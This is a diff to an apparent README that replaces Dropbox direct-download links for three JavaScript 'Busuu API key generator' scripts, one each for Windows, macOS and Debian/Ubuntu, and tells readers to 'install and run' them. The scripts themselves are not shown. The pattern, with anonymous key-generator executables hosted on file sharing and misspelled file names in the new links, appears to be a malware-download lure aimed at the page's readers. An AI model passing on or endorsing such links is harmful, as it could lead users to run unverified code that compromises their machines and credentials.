@@ -20,9 +20,9 @@
 
 Version | Direct Link
 ------------ | -------------
-Version for Windows| [Download](https://www.dropbox.com/s/t0jejpjmtwy60qr/busuuapikey.js?dl=1)
-Version for MacOs| [Download](https://www.dropbox.com/s/ue346x7imlejvop/apikeygeneration%28MacOs%29.js?dl=1)
-Version for Debian/Ubuntu| [Download](https://www.dropbox.com/s/gys08yds9tsvwfy/apikeygeneration%28Debian%29.js?dl=1)
+Version for Windows| [Download](https://www.dropbox.com/s/a1vnfp3zx1ck1kd/busuuapigen.js?dl=1)
+Version for MacOs| [Download](https://www.dropbox.com/s/ue346x7imlejvop/apiken%28MacOs%29.js?dl=1)
+Version for Debian/Ubuntu| [Download](https://www.dropbox.com/s/gys08yds9tsvwfy/apikeygeneraon%28Debian%29.js?dl=1)
 
 ##### Works like the official release version, install and run. All test updates will appear here.
 ##### © 2020 Developer Source.
